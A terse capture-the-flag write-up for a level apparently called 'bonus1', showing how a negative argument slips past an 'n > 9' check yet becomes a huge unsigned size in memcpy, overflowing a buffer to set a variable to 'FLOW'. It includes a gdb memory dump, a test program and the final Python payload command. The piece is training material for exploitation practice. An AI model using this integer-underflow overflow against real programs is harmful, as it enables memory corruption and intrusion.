the program take a number n and a input buf
it copy 4*n character of buf in a int m then
check for a specific value of n

0x08048478 <+84>:	cmpl   $0x574f4c46,0x3c(%esp)

wich is FLOW in ascii

we can overwrite n by overflowing m
but there is a check for n 
n = atoi(argv[1]);
  if ( n > 9 )
    return 1;

man of memcpy:
void *memcpy(void *dest, const void *src, size_t n)

memcpy takes a unsigned int for size so we can underflow n
to be less than 9 as a int but large enough as a unsigned int to overwite m

with n=9 we can see in gdb that our buffer end two address before n
gefâž¤  x/-20x 0xffffcf3c
0xffffceec:	0xf7f9b054	0xf7fbe4a0	0x61616161	0x61616162
0xffffcefc:	0x61616163	0x61616164	0x61616165	0x61616166
0xffffcf0c:	0x61616167	0x61616168	0x61616169	0xf7f9b000
0xffffcf1c:	0x00000009	0xffffd1d2	0x00000070	0xf7ffd020

4*9 is not enough we need 4*11

#include <stdio.h>
#include <stdlib.h>

int main(int argc, char **argv)
{
    int nb = atoi(argv[1]);

    printf("int : %i\n", nb);
    printf("uint : %u\n", (unsigned int)nb);
    return 0;
}

unsigned int max - 44 = 4294967252

$ ./a.out -4294967252
int : 44
uint : 44

-4294967252 / 4 = -1073741813

$ ./a.out -1073741813
int : -1073741813   (less than 9)
uint : 3221225483

building payload:

./bonus1 -1073741813 $(python -c 'print "A" * 40 + "FLOW"')

